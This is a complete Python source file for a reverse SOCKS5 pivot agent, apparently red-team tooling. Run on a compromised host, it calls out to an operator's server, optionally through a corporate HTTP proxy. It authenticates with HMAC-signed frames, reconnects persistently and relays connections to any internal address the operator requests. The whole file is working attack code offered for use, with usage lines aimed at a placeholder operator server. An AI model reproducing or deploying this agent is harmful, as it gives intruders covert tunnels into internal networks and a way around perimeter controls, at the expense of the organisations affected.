#!/usr/bin/env python3
"""
rsocks_agent.py — Reverse SOCKS5 Agent (pivot side)
Single file. Standard library only. No pip install.

Usage:
  python3 rsocks_agent.py --server OPS_VPS_IP:4433 --pass 'RedTeam!'

Through corporate HTTP proxy:
  python3 rsocks_agent.py --server OPS_VPS_IP:4433 --pass 'RedTeam!' --proxy 10.0.0.1:8080
"""
import argparse
import hashlib
import hmac
import socket
import struct
import threading
import time

# ── Protocol constants (inlined, identical to server) ───────────────────────
CHAN_OPEN, CHAN_DATA, CHAN_CLOSE = 0x01, 0x02, 0x03
CHAN_OPEN_OK, CHAN_OPEN_ERR     = 0x04, 0x05
KEEPALIVE                       = 0x06
HELLO, HELLO_OK, HELLO_ERR      = 0x07, 0x08, 0x09

FRAME_FMT  = '!BIH8s'
FRAME_SIZE = struct.calcsize(FRAME_FMT)


def _derive_key(passphrase):
    return hashlib.pbkdf2_hmac('sha256', passphrase.encode(),
                                b'RSocksV1Salt2026', 100_000, 32)


def _hmac8(key, tb, cid, length, payload):
    msg = struct.pack('!BIH', tb, cid, length) + payload
    return hmac.new(key, msg, hashlib.sha256).digest()[:8]


def _encode(key, tb, cid, payload=b''):
    mac = _hmac8(key, tb, cid, len(payload), payload)
    return struct.pack(FRAME_FMT, tb, cid, len(payload), mac) + payload


def _recvall(sock, n):
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk: raise ConnectionError('socket closed')
        buf += chunk
    return buf


def _recv_frame(sock, key):
    tb, cid, length, rmac = struct.unpack(FRAME_FMT, _recvall(sock, FRAME_SIZE))
    payload = _recvall(sock, length) if length else b''
    if not hmac.compare_digest(rmac, _hmac8(key, tb, cid, length, payload)):
        raise ValueError('HMAC mismatch')
    return tb, cid, payload


def _decode_open(payload):
    atyp, alen = payload[0], payload[1]
    raw  = payload[2:2+alen]
    port = struct.unpack('!H', payload[2+alen:4+alen])[0]
    if   atyp == 0x01: addr = socket.inet_ntoa(raw)
    elif atyp == 0x03: addr = raw.decode()
    elif atyp == 0x04: addr = socket.inet_ntop(socket.AF_INET6, raw)
    else: raise ValueError(f'bad atyp {atyp}')
    return addr, port


# ── Per-channel handler ───────────────────────────────────────────────────────
class Channel:
    def __init__(self, cid, addr, port, ctrl_sock, key):
        self.cid, self.key = cid, key
        self.ctrl_sock = ctrl_sock
        self._sock = None
        self._alive = True
        self._wlock = threading.Lock()
        self._addr, self._port = addr, port

    def connect(self):
        try:
            self._sock = socket.create_connection((self._addr, self._port), 10)
            self._sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            print(f'[+] ch{self.cid} -> {self._addr}:{self._port}')
            return True
        except Exception as e:
            print(f'[!] ch{self.cid} failed: {e}')
            return False

    def start(self):
        threading.Thread(target=self._pump, daemon=True).start()

    def send(self, data):
        if self._sock and self._alive:
            try: self._sock.sendall(data)
            except Exception: self.close()

    def close(self):
        self._alive = False
        if self._sock:
            try: self._sock.close()
            except Exception: pass

    def _pump(self):
        try:
            while self._alive:
                data = self._sock.recv(65536)
                if not data: break
                frame = _encode(self.key, CHAN_DATA, self.cid, data)
                with self._wlock: self.ctrl_sock.sendall(frame)
        except Exception: pass
        finally:
            self._alive = False
            try: self.ctrl_sock.sendall(_encode(self.key, CHAN_CLOSE, self.cid))
            except Exception: pass
            try: self._sock.close()
            except Exception: pass
            print(f'[-] ch{self.cid} closed')


# ── Agent main loop ──────────────────────────────────────────────────────────
class Agent:
    def __init__(self, sock, key):
        self.sock, self.key = sock, key
        self._channels = {}
        self._lock  = threading.Lock()
        self._wlock = threading.Lock()
        self._alive = True
        self._last_ka = time.time()

    def _send(self, tb, cid, payload=b''):
        frame = _encode(self.key, tb, cid, payload)
        with self._wlock: self.sock.sendall(frame)

    def run(self):
        self.sock.settimeout(30.0)
        try:
            while self._alive:
                try:
                    tb, cid, payload = _recv_frame(self.sock, self.key)
                except socket.timeout:
                    self._send(KEEPALIVE, 0)
                    if time.time() - self._last_ka > 60:
                        print('[!] keepalive timeout'); break
                    continue
                self._last_ka = time.time()
                self._dispatch(tb, cid, payload)
        except (ConnectionError, OSError) as e:
            print(f'[!] Control lost: {e}')
        finally:
            self._alive = False
            with self._lock:
                for ch in self._channels.values(): ch.close()

    def _dispatch(self, tb, cid, payload):
        if tb == CHAN_OPEN:
            try: addr, port = _decode_open(payload)
            except Exception as e:
                print(f'[!] decode: {e}'); self._send(CHAN_OPEN_ERR, cid); return
            threading.Thread(target=self._open, args=(cid, addr, port), daemon=True).start()
        elif tb == CHAN_DATA:
            with self._lock: ch = self._channels.get(cid)
            if ch: ch.send(payload)
        elif tb == CHAN_CLOSE:
            with self._lock: ch = self._channels.pop(cid, None)
            if ch: ch.close()
        elif tb == KEEPALIVE: pass

    def _open(self, cid, addr, port):
        ch = Channel(cid, addr, port, self.sock, self.key)
        if ch.connect():
            with self._lock: self._channels[cid] = ch
            self._send(CHAN_OPEN_OK, cid)
            ch.start()
        else:
            self._send(CHAN_OPEN_ERR, cid)


# ── HTTP CONNECT proxy traversal (stdlib sockets only) ───────────────────────
def _http_connect(proxy_host, proxy_port, target_host, target_port):
    sock = socket.create_connection((proxy_host, proxy_port), 10)
    req = (f'CONNECT {target_host}:{target_port} HTTP/1.1\r\n'
           f'Host: {target_host}:{target_port}\r\n\r\n').encode()
    sock.sendall(req)
    buf = b''
    while b'\r\n\r\n' not in buf:
        chunk = sock.recv(4096)
        if not chunk: raise ConnectionError('proxy closed')
        buf += chunk
    code = int(buf.split(b'\r\n')[0].split()[1])
    if code != 200: raise ConnectionError(f'proxy returned {code}')
    print(f'[+] HTTP CONNECT via {proxy_host}:{proxy_port} OK')
    return sock


# ── Auth ─────────────────────────────────────────────────────────────────────
def _auth(sock, key):
    ts = struct.pack('!Q', int(time.time()))
    sock.sendall(_encode(key, HELLO, 0, ts))
    tb, _, payload = _recv_frame(sock, key)
    if tb == HELLO_OK:
        print('[+] Authenticated'); return True
    print(f'[-] Auth rejected: {payload}'); return False


# ── Main ─────────────────────────────────────────────────────────────────────
def run(server_host, server_port, password, http_proxy=None, retry=10):
    key = _derive_key(password)
    while True:
        try:
            if http_proxy:
                ph, pp = http_proxy
                sock = _http_connect(ph, pp, server_host, server_port)
            else:
                sock = socket.create_connection((server_host, server_port), 15)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            print('[+] Connected')
            if _auth(sock, key):
                Agent(sock, key).run()
            else:
                sock.close()
        except (OSError, ConnectionRefusedError, socket.timeout) as e:
            print(f'[!] {e}')
        print(f'[*] Retry in {retry}s...')
        time.sleep(retry)


if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('--server',  required=True, help='host:port of operator server')
    p.add_argument('--pass',    dest='password', required=True)
    p.add_argument('--proxy',   default=None, help='HTTP CONNECT proxy host:port')
    p.add_argument('--retry',   type=int, default=10)
    a = p.parse_args()
    sh, sp = a.server.rsplit(':', 1)
    proxy = None
    if a.proxy:
        ph, pp = a.proxy.rsplit(':', 1)
        proxy = (ph, int(pp))
    run(sh, int(sp), a.password, proxy, a.retry)
